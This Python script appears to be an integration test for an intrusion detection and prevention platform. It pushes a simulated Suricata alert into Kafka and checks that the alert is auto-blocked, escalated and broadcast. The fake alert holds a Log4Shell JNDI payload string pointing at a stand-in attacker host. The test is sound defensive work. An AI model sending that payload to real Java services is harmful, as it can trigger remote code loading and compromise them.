import json
import time
import uuid
import psycopg
from psycopg.rows import dict_row
import redis
from kafka import KafkaProducer

DATABASE_URL = "postgresql://idsips:change-me-in-development@postgres:5432/idsips"
REDIS_URL = "redis://redis:6379/0"
KAFKA_SERVER = "kafka:9092"

def test_autonomous_detection():
    print("==================================================")
    print("Autonomous Detection & Prevention Verification")
    print("==================================================")
    
    # 1. Connect to PostgreSQL
    conn = psycopg.connect(DATABASE_URL, row_factory=dict_row)
    cur = conn.cursor()
    
    cur.execute("SELECT COUNT(*) FROM alerts WHERE status = 'AUTO_BLOCKED'")
    blocked_before = cur.fetchone()['count']
    print(f"[1] Verified Database: Currently {blocked_before} AUTO_BLOCKED alerts in registry.")
    
    # 2. Verify Redis PubSub & IPS Controller
    r = redis.from_url(REDIS_URL)
    pubsub = r.pubsub()
    pubsub.subscribe('alerts', 'ids.ips.actions')
    time.sleep(0.5)
    print("[2] Verified Redis Event Bus: Connected to 'alerts' & 'ids.ips.actions' channels.")
    
    # 3. Verify Kafka Broker
    producer = KafkaProducer(
        bootstrap_servers=KAFKA_SERVER,
        value_serializer=lambda v: json.dumps(v).encode('utf-8')
    )
    print("[3] Verified Kafka Ingress Broker: Connected to kafka:9092.")
    
    # 4. Inject a Real-World Simulated Cyber Attack via Suricata Ingress into Kafka
    attacker_ip = f"185.220.101.{int(time.time()) % 200 + 10}"
    suricata_alert_event = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000000+0000", time.gmtime()),
        "event_type": "alert",
        "src_ip": attacker_ip,
        "src_port": 49152,
        "dest_ip": "10.240.10.12",
        "dest_port": 8080,
        "proto": "TCP",
        "alert": {
            "action": "allowed",
            "gid": 1,
            "signature_id": 2035124,
            "rev": 1,
            "signature": "ET EXPLOIT Apache Log4j RCE Core Probing (CVE-2021-44228)",
            "category": "Attempted Remote Code Execution",
            "severity": 1
        },
        "payload_printable": "${jndi:ldap://evil-c2.attacker.com/exploit}"
    }
    
    print(f"\n[4] Injecting High-Impact Suricata Threat into Kafka Stream...")
    print(f"    Attacker IP: {attacker_ip}")
    print(f"    Threat: {suricata_alert_event['alert']['signature']}")
    print(f"    Payload: {suricata_alert_event['payload_printable']}")
    
    producer.send("ids.alerts", suricata_alert_event)
    producer.flush()
    
    print("\n[5] Waiting 3 seconds for Autonomous Detection Engine & IPS Controller...")
    time.sleep(3)
    
    # 5. Check if alert was ingested, normalized, evaluated, and AUTO_BLOCKED
    cur.execute(
        "SELECT id, signature, severity, status, risk_score, src_ip, timestamp FROM alerts WHERE src_ip = %s ORDER BY timestamp DESC LIMIT 1",
        (attacker_ip,)
    )
    alert = cur.fetchone()
    
    if alert:
        print("\n==================================================")
        print(" autonomous detection & classification result:")
        print("==================================================")
        print(f"  Alert ID    : {alert['id']}")
        print(f"  Signature   : {alert['signature']}")
        print(f"  Severity    : {alert['severity']}")
        print(f"  Risk Score  : {alert['risk_score']}")
        print(f"  Final Status: {alert['status']}")
        
        if alert['status'] == 'AUTO_BLOCKED':
            print("  >>> SUCCESS: Attack was AUTONOMOUSLY BLOCKED by the platform! <<<")
        else:
            print(f"  Status is {alert['status']}")
            
        # Check incident escalation
        cur.execute("SELECT id, title, severity, status FROM incidents WHERE title ILIKE %s ORDER BY created_at DESC LIMIT 1", (f"%{alert['signature'][:25]}%",))
        incident = cur.fetchone()
        if incident:
            print(f"  Incident ID : {incident['id']} (Status: {incident['status']})")
    else:
        print("Alert record not yet found in database")
        
    # 6. Check IPS actions
    cur.execute("SELECT id, target, action, status, reason FROM ips_actions WHERE target = %s", (attacker_ip,))
    ips_rule = cur.fetchone()
    if ips_rule:
        print("\n==================================================")
        print(" autonomous ips firewall quarantine result:")
        print("==================================================")
        print(f"  Target IP   : {ips_rule['target']}")
        print(f"  Action      : {ips_rule['action']}")
        print(f"  Status      : {ips_rule['status']}")
        print(f"  Reason      : {ips_rule['reason']}")
        print("  >>> SUCCESS: IPS drop rule automatically generated! <<<")
    else:
        print(f"No specific IPS action for {attacker_ip}")

    # 7. Check Redis pubsub broadcast for WebSocket clients
    messages_received = []
    msg = pubsub.get_message(timeout=2)
    while msg:
        if msg['type'] == 'message':
            messages_received.append(msg)
        msg = pubsub.get_message(timeout=0.5)
        
    print("\n==================================================")
    print(" real-time websocket broadcast verification:")
    print("==================================================")
    print(f"  Redis pubsub messages dispatched: {len(messages_received)}")
    for m in messages_received[:3]:
        data = m['data']
        if isinstance(data, bytes):
            data = data.decode('utf-8')
        try:
            parsed = json.loads(data)
            print(f"  - Channel [{m['channel'].decode() if isinstance(m['channel'], bytes) else m['channel']}]: {parsed.get('signature', parsed.get('action'))} -> {parsed.get('status', 'OK')}")
        except:
            print(f"  - Channel: {data[:60]}...")
            
    cur.close()
    conn.close()

if __name__ == "__main__":
    test_autonomous_detection()
